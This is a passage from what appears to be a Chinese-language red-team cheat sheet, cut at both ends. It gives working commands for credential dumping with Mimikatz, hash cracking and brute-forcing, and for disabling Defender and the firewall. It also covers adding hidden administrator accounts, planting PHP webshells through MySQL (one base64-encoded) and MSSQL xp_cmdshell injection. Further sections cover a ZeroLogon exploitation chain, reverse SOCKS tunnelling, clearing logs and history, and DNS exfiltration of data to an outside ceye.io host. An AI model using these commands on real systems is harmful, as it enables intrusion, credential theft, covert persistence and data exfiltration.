-3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689-3690,3703,3737,3766,3784,3800-3801,3809,3814,3826-3828,3851,3869,3871,3878,3880,3889,3905,3914,3918,3920,3945,3971,3986,3995,3998,4000-4006,4045,4111,4125-4126,4129,4224,4242,4279,4321,4343,4443-4446,4449,4550,4567,4662,4848,4899-4900,4998,5000-5004,5009,5030,5033,5050-5051,5054,5060-5061,5080,5087,5100-5102,5120,5190,5200,5214,5221-5222,5225-5226,5269,5280,5298,5357,5405,5414,5431-5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678-5679,5718,5730,5800-5802,5810-5811,5815,5822,5825,5850,5859,5862,5877,5900-5904,5906-5907,5910-5911,5915,5922,5925,5950,5952,5959-5963,5987-5989,5998-6007,6009,6025,6059,6100-6101,6106,6112,6123,6129,6156,6346,6389,6502,6510,6543,6547,6565-6567,6580,6646,6666-6669,6689,6692,6699,6779,6788-6789,6792,6839,6881,6901,6969,7000-7002,7004,7007,7019,7025,7070,7100,7103,7106,7200-7201,7402,7435,7443,7496,7512,7625,7627,7676,7741,7777-7778,7800,7911,7920-7921,7937-7938,7999-8002,8007-8011,8021-8022,8031,8042,8045,8080-8090,8093,8099-8100,8180-8181,8192-8194,8200,8222,8254,8290-8292,8300,8333,8383,8400,8402,8443,8500,8600,8649,8651-8652,8654,8701,8800,8873,8888,8899,8994,9000-9003,9009-9011,9040,9050,9071,9080-9081,9090-9091,9099-9103,9110-9111,9200,9207,9220,9290,9415,9418,9485,9500,9502-9503,9535,9575,9593-9595,9618,9666,9876-9878,9898,9900,9917,9929,9943-9944,9968,9998-10004,10009-10010,10012,10024-10025,10082,10180,10215,10243,10566,10616-10617,10621,10626,10628-10629,10778,11110-11111,11967,12000,12174,12265,12345,13456,13722,13782-13783,14000,14238,14441-14442,15000,15002-15004,15660,15742,16000-16001,16012,16016,16018,16080,16113,16992-16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221-20222,20828,21571,22939,23502,24444,24800,25734-25735,26214,27000,27352-27353,27355-27356,27715,28201,30000,30718,30951,31038,31337,32768-32785,33354,33899,34571-34573,35500,38292,40193,40911,41511,42510,44176,44442-44443,44501,45100,48080,49152-49161,49163,49165,49167,49175-49176,49400,49999-50003,50006,50050,50300,50389,50500,50636,50800,51111,51103,51493,52673,52822,52848,52869,54045,54328,55055-55056,55555,55600,56737-56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389

```

## 字典

<details>
<summary>top200</summary>

```
123456
password
123456789
12345678
12345
qwerty
123123
111111
abc123
1234567
dragon
1q2w3e4r
sunshine
654321
master
1234
football
1234567890
000000
computer
666666
superman
michael
internet
iloveyou
daniel
1qaz2wsx
monkey
shadow
jessica
letmein
baseball
whatever
princess
abcd1234
123321
starwars
121212
thomas
zxcvbnm
trustno1
killer
welcome
jordan
aaaaaa
123qwe
freedom
password1
charlie
batman
jennifer
7777777
michelle
diamond
oliver
mercedes
benjamin
11111111
snoopy
samantha
victoria
matrix
george
alexander
secret
cookie
asdfgh
987654321
123abc
orange
fuckyou
asdf1234
pepper
hunter
silver
joshua
banana
1q2w3e
chelsea
1234qwer
summer
qwertyuiop
phoenix
andrew
q1w2e3r4
elephant
rainbow
mustang
merlin
london
garfield
robert
chocolate
112233
samsung
qazwsx
matthew
buster
jonathan
ginger
flower
555555
test
caroline
amanda
maverick
midnight
martin
junior
88888888
anthony
jasmine
creative
patrick
mickey
123
qwerty123
cocacola
chicken
passw0rd
forever
william
nicole
hello
yellow
nirvana
justin
friends
cheese
tigger
mother
liverpool
blink182
asdfghjkl
andrea
spider
scooter
richard
soccer
rachel
purple
morgan
melissa
jackson
arsenal
222222
qwe123
gabriel
ferrari
jasper
danielle
bandit
angela
scorpion
prince
maggie
austin
veronica
nicholas
monster
dexter
carlos
thunder
success
hannah
ashley
131313
stella
brandon
pokemon
joseph
asdfasdf
999999
metallica
december
chester
taylor
sophie
samuel
rabbit
crystal
barney
xxxxxx
steven
ranger
patricia
christian
asshole
spiderman
sandra
hockey
angels
security
parker
heather
888888
victor
harley
333333
system
slipknot
november
jordan23
canada
tennis
qwertyui
casper
```

</details>


## Mimikatz

一条命令
```
.\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
```
控制台执行多条命令，用log防止进程崩溃，数据丢失
```
mimikatz # privilege::debug
mimikatz # log
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::wdigest
```
msf中执行命令
```
mimikatz_command -f sekurlsa::logonPasswords full
mimikatz_command -f sekurlsa::wdigest
```
注册表开启wdigest,08r2后默认关闭。需要目标注销，重新登录。2016需要重启。
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1
```
### bypass lsa Protection(ppl)
查询是否启用
```
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa

```
把mimidriver.sys拷贝到同级目录，进行加载bypass
```
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # privilege::debug    
mimikatz # token::elevate
mimikatz # sekurlsa::logonpasswords
mimikatz # !processprotect /process:lsass.exe
mimikatz # !-
```

### hashcat 使用
```
serv-u hash破解
hashcat -m 24 -a 0 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt

7位数字破解
hashcat -a 3 -m 0 --force 25c3e88f81b4853f2a8faacad4c871b6 ?d?d?d?d?d?d?d

7位小写字母破解：
hashcat -a 3 -m 0 --force 7a47c6db227df60a6d67245d7d8063f3 ?l?l?l?l?l?l?l

1-8位数字破解：
hashcat -a 3 -m 0 --force 4488cec2aea535179e085367d8a17d75 --increment --increment-min 1 --increment-max 8 ?d?d?d?d?d?d?d?d

1-8位小写字母+数字破解
hashcat -a 3 -m 0 --force ab65d749cba1656ca11dfa1cc2383102 --increment --increment-min 1 --increment-max 8 ?h?h?h?h?h?h?h?h

特定字符集：123456abcdf!@+-
hashcat -a 3 -1 123456abcdf!@+- 8b78ba5089b11326290bc15cf0b9a07d ?1?1?1?1?1

字典破解
-a 0是指定字典破解模式，-o是输出结果到文件中
hashcat -a 0 ede900ac1424436b55dc3c9f20cb97a8 password.txt -o result.txt

批量破解
hashcat -a 0 hash.txt password.txt -o result.txt

字典组合破解：
hashcat -a 1 25f9e794323b453885f5181f1b624d0b pwd1.txt pwd2.txt

字典+掩码破解
hashcat -a 6 9dc9d5ed5031367d42543763423c24ee password.txt ?l?l?l?l?l

mssql
hashcat -a 3 -m 132 --force 0x01008c8006c224f71f6bf0036f78d863c3c4ff53f8c3c48edafb ?l?l?l?l?l?d?d?d

wordpress密码hash破解
具体加密脚本在./wp-includes/class-phpass.php的HashPassword函数
hashcat -a 3 -m 400 --force $P$BYEYcHEj3vDhV1lwGBv6rpxurKOEWY/ ?d?d?d?d?d?d

discuz用户密码hash破解
其密码加密方式md5(md5($pass).$salt)
hashcat -a 3 -m 2611 --force 14e1b600b1fd579f47433b88e8d85291: ?d?d?d?d?d?d





```





## cs凭证解析

提取用户名
```
awk -F":::" '{print $1}' credentials.txt | awk -F"\\" '{print $2}'
```
提取hash
```
awk -F":::" '{print $2}' credentials.txt
```





## 存活主机
```
for /L %I in (1,1,256) DO @ping -w 1 -l 1 192.168.202.%I | findstr "TTL="
```

## bypass
Defender排除项
```
powershell -ExecutionPolicy Bypass Add-MpPreference -ExclusionPath "C:\test"

```

## gobuster

```
gobuster dir -u https://buffered.io -w ~/wordlists/shortlist.txt
```

## dirsearch

```
python3 dirsearch.py -e php,html,js -u https://target
```

```
python3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist
```

```
python3 dirsearch.py -e php,htm,js,bak,zip,tgz,txt -u https://target -t 20
```

```
python3 dirsearch.py -e php,html,js -u https://target --proxy 127.0.0.1:8080
```

```
python3 dirsearch.py -e php,html,js -u https://target --proxy socks5://10.10.0.1:8080
```

## nbtscan

```
nbtscan.exe 10.11.1.0/24
```

## 代理工具
proxychain   
sockscap64    
proxifier   

https://drive.google.com/drive/folders/1x5naJeK2YkV6QCYUlUg5QNMl1Izf4-ti   
https://www.mediafire.com/folder/32rj1769a2w82/v4.7   

## python socks
```
import socket
import socks
import requests

socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 1081)
socket.socket = socks.socksocket
```

## 内网穿透工具
### yuze windows，linux 编译后只有20k，30k
```
git clone https://github.com/P001water/yuze.git
cd yuze
echo > Makefile

CC = gcc
CFLAGS = -Wall -Wextra -g   # 添加任何额外的编译器标志
CFLAGS += -Wunused-parameter -Wno-implicit-fallthrough  # 添加忽略警告的编译器标志

SRCDIR = .
OBJDIR = obj
BINDIR = bin

SRCS := main.c portTransmit.c protoFunc.c RedesignAPI.c socksServer.c tunnelSock2sock.c
OBJS := $(patsubst $(SRCDIR)/%.c,$(OBJDIR)/%.o,$(SRCS))
TARGET = yuze   # 静态可执行文件名

.PHONY: all clean

all: $(BINDIR)/$(TARGET)

$(BINDIR)/$(TARGET): $(OBJS)
	@mkdir -p $(BINDIR)
	$(CC) $(CFLAGS) $^ -o $@ -static

$(OBJDIR)/%.o: $(SRCDIR)/%.c
	@mkdir -p $(OBJDIR)
	$(CC) $(CFLAGS) -c $^ -o $@

clean:
	rm -rf $(OBJDIR)/* $(BINDIR)/*




cat << EOF > Makefile
CC = mips-linux-gnu-gcc
CFLAGS = -Wall -Wextra -g   # 添加任何额外的编译器标志
CFLAGS += -Wunused-parameter -Wno-implicit-fallthrough  # 添加忽略警告的编译器标志

SRCDIR = .
OBJDIR = obj
BINDIR = bin

SRCS := main.c portTransmit.c protoFunc.c RedesignAPI.c socksServer.c tunnelSock2sock.c
OBJS := \$(patsubst \$(SRCDIR)/%.c,\$(OBJDIR)/%.o,\$(SRCS))
TARGET = yuze   # 静态可执行文件名

.PHONY: all clean

all: \$(BINDIR)/\$(TARGET)

\$(BINDIR)/\$(TARGET): \$(OBJS)
	@mkdir -p \$(BINDIR)
	\$(CC) \$(CFLAGS) \$^ -o \$@ -static

\$(OBJDIR)/%.o: \$(SRCDIR)/%.c
	@mkdir -p \$(OBJDIR)
	\$(CC) \$(CFLAGS) -c \$^ -o \$@

clean:
	rm -rf \$(OBJDIR)/* \$(BINDIR)/*
EOF


```
### reverse socks
```
git clone https://github.com/Acebond/ReverseSocks5.git

下面需要把CGO_ENABLED=0因为这样设置会把程序编译成静态文件，可在其他系统运行
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc go build
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc go build -ldflags="-s -w"

mips环境，需要在debian,centos7下面安装mips-linux-gnu-gcc
CGO_ENABLED=0 GOOS=linux GOARCH=mips CC=mips-linux-gnu-gcc go build -ldflags="-s -w"

使用
reversesocks5.exe -connect 1.1.1.1 -psk admin@1
reversesocks5.exe -psk admin@1


```
### reverse dns,reverse https
```
git clone https://github.com/kost/revsocks.git

下面需要把CGO_ENABLED=0因为这样设置会把程序编译成静态文件，可在其他系统运行
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc go build
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc go build -ldflags="-s -w"

mips环境，需要在debian,centos7下面安装mips-linux-gnu-gcc
CGO_ENABLED=0 GOOS=linux GOARCH=mips CC=mips-linux-gnu-gcc go build -ldflags="-s -w"

反向https
Usage:
1) Start on VPS: `revsocks -listen :8443 -socks 127.0.0.1:1080 -pass SuperSecretPassword -tls -ws`
2) Start on client: `revsocks -connect https://clientIP:8443 -pass SuperSecretPassword -ws`
3) Connect to 127.0.0.1:1080 on the VPS with any socks5 client.

反向dns
0) setup your domain records
1) Start on the DNS server: revsocks -dns example.com -dnslisten :53 -socks 127.0.0.1:1080 -pass 52fdfc072182654f163f5f0f9a621d729566c74d10037c4d7bbb0407d1e2c64
2) Start on the target: revsocks -dns example.com -pass 52fdfc072182654f163f5f0f9a621d729566c74d10037c4d7bbb0407d1e2c64
3) Connect to 127.0.0.1:1080 on the DNS server with any socks5 client.


```


### fuso

- https://github.com/editso/fuso.git   
- 相对冷门，不会被杀
在9004上开启socks5代理  
```
fuc.exe 159.138.0.0 9003 -h 127.0.0.1 -p 9004 -b 9004 -n test -t socks5 --bridge-host 0.0.0.0 --bridge-port 9004
```

### frp

### nps
https://github.com/ehang-io/nps     

```
 sudo ./nps install
 sudo nps start
```
安装后配置文件位置/etc/nps，默认密码(可在配置文件里面修改)admin/123  

### iox

### Stowaway
https://github.com/lz520520/Stowaway

### Venom
https://github.com/Dliv3/Venom



## ssh
无记录shell

```
 ssh -T root@192.168.1.1 /usr/bin/bash -i
```

## grep

```
grep -E "([0-9]{1,3}[\.]){3}[0-9]{1,3}" -r xxx --color=auto
```

```
grep -E "https?://[a-zA-Z0-9\.\/_&=@$%?~#-]*" -r xxx --color=auto
```

```
grep -EHirn "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into" APKfolder/
```

```
grep -ohr -E "https?://[a-zA-Z0-9\.\/_&=@$%?~#-]*" /app/ |sort|uniq >> test.txt
```

web应用
```
grep -EHirn '--include=*.'{java,jsp,jspx,xml,conf,json,ini,properties,yaml,toml,plist,txt,sql} "accesskey|api_key|apikey|jdbc|username|pass|passwd|password" webapps/
```

搜索文件内的字符串
```
grep -r "test" ./src

显示行号
grep -rn "test" ./src
```


## mysql

开远程

```
use mysql;  
update user set host = '%' where user = 'root';  
FLUSH PRIVILEGES ;  
select host, user from user;
 mysql -uroot -p -e "select * from mysql.user;" >1.txt
```

不登录直接执行sql
```
mysql -uaHmin -proot test -e "select now()" -N >H:/work/target1.txt
mysql -uroot -e "show databases;" >1.txt
```

mysql getshell

```
show variables like '%secure%'    
select '<?php eval($_POST[xxx]) ?>' into outfile '/var/www/xx.php';  
select '<?php eval($_POST[xx]) ?>' into dumpfile '/var/www/xx.php';  
```

```
set global general_log=on;  
set global general_log_file='/var/www/1.php';  
select '<?php eval($_POST[s6]) ?>';
```

```
select '<?php file_put_contents("abab.php",base64_decode("Jmx0Oz9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQogICAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7IA0KCSRfU0VTU0lPTlsmIzM5O2smIzM5O109JGtleTsNCgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsNCglpZighZXh0ZW5zaW9uX2xvYWRlZCgmIzM5O29wZW5zc2wmIzM5OykpDQoJew0KCQkkdD0iYmFzZTY0XyIuImRlY29kZSI7DQoJCSRwb3N0PSR0KCRwb3N0LiIiKTsNCgkJDQoJCWZvcigkaT0wOyRpJmx0O3N0cmxlbigkcG9zdCk7JGkrKykgew0KICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgDQogICAgCQkJfQ0KCX0NCgllbHNlDQoJew0KCQkkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsNCgl9DQogICAgJGFycj1leHBsb2RlKCYjMzk7fCYjMzk7LCRwb3N0KTsNCiAgICAkZnVuYz0kYXJyWzBdOw0KICAgICRwYXJhbXM9JGFyclsxXTsNCgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCkge2V2YWwoJHAuIiIpO319DQogICAgQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7DQo/Jmd0Ow0K"));?>' into outfile 'C:/wamp/www/abb.php';

```

## sqlmap

```
python sqlmap.py -u "http://www.vuln.cn/post.php?id=1" --proxy "http://127.0.0.1:1080"
```

```
python sqlmap.py  -u "http://www.vuln.cn" –cookie "id=11" --level 2
```

```
python sqlmap.py -u "www.xxxx.com/product/detail/id/3*.html" --dbms=mysql -v 3 
```

```
python sqlmap.py -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql  --dbs
```

```
python sqlmap.py -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql  -D test --tables
```

```
python sqlmap.py -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql  -D test -T admin –-columns
```

```
python sqlmap.py -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql -D test -T admin -C "username,password" --dump
```

```
python sqlmap.py -r "c:\request.txt" -p id –dbms mysql –file-read="e:\www\as\config.php"
```

## sql注入

### mssql 
堆叠注入，xpcmdshell
```
http://www.vuln.cn/post.php?id=11;DECLARE/**/@ljbd/**/VARCHAR(8000);SET/**/@ljbd=0x70696e67202d6e6320312077772e36373332396163312e646e732e313433332e65752e6f7267;EXEC/**/master..xp_cmdshell/**/@ljbd--
```

## gitlab相关
进入控制台

```
gitlab-rails console production
如果没配置环境变量，cd到安装目录下

/bin/rails console production

如果报错可用
./rails console -e production
```
修改密码
```
通过用户名查找，赋值给user
user = User.where(username:"root").first

修改密码
user.password = "abc123"
user.password_confirmation= "abc123"
user.save!
```
把用户设为admin
```
通过用户名查找，赋值给user
user = User.where(username:"test").first
user.admin=ture
user.save!
```
新增用户参考：https://gist.github.com/tacettin/8182358



## 找可写目录
```

### linux
#### 在/root  war文件的同目录下
写
find /root -name war|while read file;do sh -c "echo $file">$(dirname $file)/finddir.txt;done
删
find /root -name war|while read file;do sh -c "rm $(dirname $file)/finddir.txt";done

#### 在/root  war文件夹下
写
find /root -name war|while read file;do sh -c "echo $file">$file/finddir.txt;done
删
find /root -name war|while read file;do sh -c "rm $file/finddir.txt";done

### windows
#### 在C:\Users\liulangmao\Desktop任意子目录  war.txt文件的同目录下
写
for /f %i in ('dir /s /b C:\Users\liulangmao\Desktop\war.txt') do (echo %i > %i\..\finddir.txt)
删
for /f %i in ('dir /s /b C:\Users\liulangmao\Desktop\war.txt') do (del %i\..\finddir.txt)

#### 在C:\Users\liulangmao\Desktop任意子目录  war文件夹下
写
for /f %i in ('dir /s /b C:\Users\liulangmao\Desktop\war') do (echo %i > %i\finddir.txt)
删
for /f %i in ('dir /s /b C:\Users\liulangmao\Desktop\war') do (del %i\finddir.txt)
```
示例：在weblogic靶机/root 所有war文件夹下的finddir.txt文件中写入该war文件夹的路径。
```
find /root -name war|while read file;do sh -c "echo $file">$file/finddir.txt;done

```
 程序名找启动路径
```
wmic process where name='mysqld.exe' get processid,executablepath,name
```
程序pid找路径
```
wmic process get name,executablepath,processid|findstr pid
```

启动路径找login.jsp
```
for /f %i in ('dir /s /b D:\UFGOV\U8\login.jsp') do (echo %i)
```

base64分段不换行追加写文件
```
echo|set /p=\"PCFET0NUWVBFIGh0bWw+IDxodG1sPiA8aGVhZD4gPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiIC8+PGgxPjIwMjHlubR4eHjnvZHnu5zlronlhajlrp7miJjmvJTnu4M8L2gxPg==\" > D:\UFGOV\U8\webapps\demonstrate.txt
```

解决cmd无回显问题
```
powershell Get-ChildItem C:
```


## hydra

```
参数：
-l 指定的用户名 -L 用户名字典
-p 指定密码 -P 密码字典
-s 指定端口 
-o 输出文件
-t 任务数默认16
-f 爆破成功一个就停止
-v 报错日志详细 -V 攻击日志
>hydra -L /root/user.txt -P pass.txt 10.1.1.10 mysql
>hydra -L /root/user.txt -P pass.txt 10.1.1.10 ssh -s 22 -t 4
>hydra -L /root/user.txt -P pass.txt 10.1.1.10 mssql -vv
>hydra -L /root/user.txt -P pass.txt 10.1.1.10 rdp -V
>hydra -L /root/user.txt -P pass.txt 10.1.1.10 smb -vV
>hydra -L /root/user.txt -P pass.txt ftp://10.1.1.10

hydra -l Administrator -P password.txt rdp://192.168.1.111   
hydra -l root -P password.txt 192.168.1.111 mysql
hydra -l sa -P password.txt 192.168.1.111 mssql
hydra爆破http：( http-get or http-form-post.)
hydra -l admin -P password.txt 192.168.1.111 http-get /login.php
hydra -l admin -P password.txt 192.168.213.135 http-form-post "/dvwa/login.php:user=^USER^&pass=^PASS^:<title>invalide</title"【注】（user,pass改为账户密码提交表单<label for="">的值）
hydra -l root -P password.txt 192.168.1.111 ssh
hydra -l root -P /root/pw.txt -t 6 -s 22 ssh://192.168.1.1

hydra -s 3389 -V -l administrator -p admin -t 16 -M 3389.txt rdp


```

## medusa

```
参数：
-h 目标名或IP  -H 目标列表
-u 用户名 -U 用户名字典
-p 密码 -P 密码字典 -f 爆破成功停止 -M 指定服务 -t 线程
-n 指定端口 -e ns 尝试空密码和用户名密码相同
>medusa -h ip -u sa -P /pass.txt -t 5 -f -M mssql
>medusa -h ip -U /root/user.txt -P /pass.txt -t 5 -f -M mssql
```

## python3 socks4端口扫描
```
#!/usr/bin/python
# coding=utf8

import requests
import ssl
import socket
import socks
import requests
socks.set_default_proxy(socks.SOCKS4,"1.1.1.10",11665)
socket.socket = socks.socksocket
print(requests.get('http://ifconfig.me/ip').text)
"""
5.18
"""

ssl._create_default_https_context = ssl._create_unverified_context
requests.packages.urllib3.disable_warnings()

class Vul_check:

    # def __init__(self, main_dict):
    #     self.main_dict = main_dict
    #     self.suc = []

    def attrack(self, host):
        start_port = [21, 22, 80, 8080, 443, 3306, 1433, 1521, 5432, 8000, 8080, 8888, 9200, 5001, 6379, 8089, 5000, 3389, 7001, 5985]
        for port in start_port:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    result = s.connect_ex((host, port))
                    if result == 0:
                        print(f"{host} {port} open")
                        # open_ports.append(port)
            except Exception as e:
                # print(f"Error scanning port {port}: {e}")
                pass
        # return open_ports


    def check(self):
        from concurrent.futures import ThreadPoolExecutor, wait, ALL_COMPLETED
        executor = ThreadPoolExecutor(max_workers=10)
        thread_list = []
        # target_urls = self.main_dict['target_urls']

        for num in range(1,254):
            host = f"10.10.0.{num}"
            thread_num = executor.submit(self.attrack, (host.strip()))
            thread_list.append(thread_num)

        wait(thread_list, return_when=ALL_COMPLETED)
        # return self.suc

# with open("target.txt",'r') as ff:
#     urls = ff.readlines()
#
# setting_dict = dict()
# setting_dict['target_urls'] = urls
# setting_dict['start_socks'] = False
# setting_dict['start_http'] = False
# setting_dict['proxy_ip'] = '127.0.0.1'
# setting_dict['proxy_port'] = 8080
# setting_dict['timeout'] = (5,15)
# setting_dict['thread_num'] = 10

s = Vul_check()
s.check()
```

## python交互shell

py3

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

py2
```
python2 -c 'import pty;pty.spawn("/bin/sh")'

python -c 'import pty;pty.spawn("/bin/bash")'
```
用完记得清记录
```
history -c
```


## 无交互添加用户

```
useradd newuser;echo "newuser:password"|chpasswd
```

```
useradd -p `openssl passwd 123456` guest
```

```
useradd -p "$(openssl passwd 123456)" guest
```

```
useradd newuwer;echo -e "123456\n123456\n" |passwd newuser
```

### 自动申请openssl和手动申请
```
yum install certbot
certbot certonly --standalone -d yourdomain.com

apt-get install certbot
certbot certonly --standalone -d yourdomain.com

yum install openssl
mkdir /opt/openssl/ && cd /opt/openssl/
openssl genpkey -algorithm RSA -out privkey.pem
openssl req -new -key privkey.pem -out server.csr -subj "/C=US/ST=State/L=City/O=Organization/CN=CommonName"
openssl x509 -req -days 365 -in server.csr -signkey privkey.pem -out fullchain.pem
rm server.csr -y 
```

### windows
```
net user admin$ Afabab@20 /add
net localgroup administrators admin$ /add

net user guest /active:yes
net localgroup administrators guest /add

Net localgroup Administrators kent /add /domain 将域用户添加到域管理员组

Net localgroup Administrators /add test\kent 将域用户添加到本地管理员组
```

## 防火墙
```
关闭防火墙

netsh firewall set opmode mode=disable

放行远程8888端口进来的流量
netsh advfirewall firewall add rule name="88" protocol=TCP dir=in remoteport=8888 action=allow

放行出去到远程8888端口的流量
netsh advfirewall firewall add rule name="88" protocol=TCP dir=out remoteport=8888 action=allow

放行本地4444端口出去的流量
netsh advfirewall firewall add rule name="44" protocol=TCP dir=out localport=4444 action=allow

放行从本地4444端口进来的流量
netsh advfirewall firewall add rule name="44" protocol=TCP dir=in localport=4444 action=allow

删除规则
netsh advfirewall firewall delete rule name="88"

查看防火墙配置(可看到具体规则等配置)
netsh firewall show config

关闭windefebd
net stop windefend

netsh firewall set portopening TCP 445 ENABLE //打开445端口    
netsh firewall set portopening TCP 3389 ENABLE //开放终端  
netsh firewall delete allowedprogram C:/A.exe //删除放行程序A.exe   
netsh firewall set allowedprogram C:/A.exe test ENABLE //添加程序C盘下的A.exe并放行   
netsh firewall add allowedprogram C:/A.exe test ENABLE //添加程序C盘下的A.exe并放行   

新版本命令   

netsh advfirewall firewall add rule name="test" dir=in action=allow program="C:\windows\temp\update.exe" enable=yes   
netsh advfirewall firewall add rule name="test" dir=out action=allow program="C:\windows\temp\update.exe" enable=yes   

```
端口转发   
把本地的 801 端口转发到远程的 172.23.80.14 的 80 端口
```
netsh interface portproxy add v4tov4 listenport=801 connectport=80 connectaddress=172.23.80.14
```

iptables 放行  
```
iptables -A INPUT -p tcp --dport 80 -j ACCEPT

```

## frp常用配置
frpc.ini
```
[common]
server_addr = xxxxxx
server_port = 7000

[rdp]
type = tcp
local_port = 3389
remote_port = 3389

[plugin_http_proxy]
type = tcp
remote_port = 10801
plugin = http_proxy

[plugin_socks5]
type = tcp
remote_port = 1080
plugin = socks5

```

## ZeroLogon

- 产生日志 4742(利用成功), 5580(利用失败) 
- 流量特征明显
- 会被av直接秒
- 有可能会导致目标脱域
- 代理不稳，容易出问题



```
 git clone https://github.com/mstxq17/cve-2020-1472.git
 
 python3 zerologon_tester.py Dc02 172.23.119.120 域外检测
 
 PingCastle.exe --server 172.23.119.120 --scanner zerologon --scmode-dc 域内检测
 
```

洞清空目标域控机器账户密码
```
python3 cve-2020-1472-exploit.py Dc02$ 172.23.119.120

```
无密码远程提取 ntds.dit
```
python3 secretsdump.py qq.local/'Dc02$'@172.23.119.120 -no-pass -outputfile qq.local.ntds.hash
```

用 administrator 域管账户 hash 远程导出域控机器账户 hash [hex 格式]
```
python3 secretsdump.py -hashes :ccef208c6485269c20db2cad21734fe7 qq/administrator@172.23.119.120
```
用上面的 hex 还原目标域控机器账户密码
```
python3 restorepassword.py Dc02@Dc02 -target-ip 172.23.119.120 -hexpass daf1d2acc25d2e54218921737a40d58192b9bcdf089ddbeaf9f7931571b07916f96e2c51d8d00f56d2440c13c0e5586e2dafd1669e37131***

```



## 删rdp日志

清除远程桌面连接记录,创建clear.bat

```
@echo off
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"
cd %userprofile%\documents\attrib Default.rdp -s -h
del Default.rdp
```


## 开3389
```
方法一
wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != "") call setallowtsconnections 1
wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
net start TermService

方法二
#设置远程桌面端口
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /t REG_DWORD /v portnumber /d 3389 /f
#开启远程桌面
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
#检查端口状态
netstat -an|find "3389"
#关闭远程桌面
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 0
```

## 文件搜索
https://www.anquanke.com/post/id/245019

```
findstr /s /i /n /d:C:\ /c:"123123" *.txt
```

```
for /r C: %i in (login.*) do @echo %i
```

```
where /R C: login.*
```

```
dir /s/a-d/b login.*
```

```
find / -name index.php
```

```
find / -name index.php
```

```
find / -name "index.php" | xargs grep "111222"
```

```
updatedb && locate index.php
```


```
进程路径
wmic process get name,executablepath
```
### 外带oob
Windows
在windows当中，%cd% 代表的是当前目录，我们通过echo将当前目录写入文本temp,然后荣国certutil对文件内容进行base64编码，再过滤certutil携带的字符，将它赋给一个变量，最后通过nslookup外带出来，从而实现获取当前目录的目的。
```
echo %cd% > temp&&certutil -encode temp temp1&&findstr /L /V "CERTIFICATE" temp1 > temp2&&set /p ADDR=<temp2&&nslookup %ADDR%.is1lv6.ceye.io
```
下面这个语句，主要是过滤作用。把helo.txt文件中的“=”过滤并重新输出文件。
```
for /f "delims=^= tokens=1,*" %i in (helo.txt) do (echo %i>>text3.txt)
```
为什么在上面需要过滤=，主要是因为在执行ping命令的时候是不允许带=号的，相较于nslookup，ping命令成功率相对较高，但如果路径过长，可能会导致失败。具体多长需要大家自行试验。
```
echo %cd% > temp&&certutil -encode temp temp1&&findstr /L /V "CERTIFICATE" temp1 > temp2&&for /f "delims=^= tokens=1,*" %i in (temp2) do (echo %i>>temp3)&&set /p ADDR=<temp3&ping %ADDR%.is1lv6.ceye.io
```
如果需要外带多行命令，则需要以下语句：
```
where /R C: login.* > test && certutil -encodehex -f test test.hex 4 && powershell $text=Get-Content test.hex;$sub=$text -replace(' ','');$j=11111;foreach($i in $sub){ $fin=$j.tostring()+'.'+$i+'.is1lv6.ceye.io';$j += 1; nslookup $fin }
（b）Linux
```
在linux中pwd也是查看当前目录的，我们通过tr -d将换行符去掉并通过xxd -ps将值转化为16进制，这样我们即可外带出自己想要的东西。
```
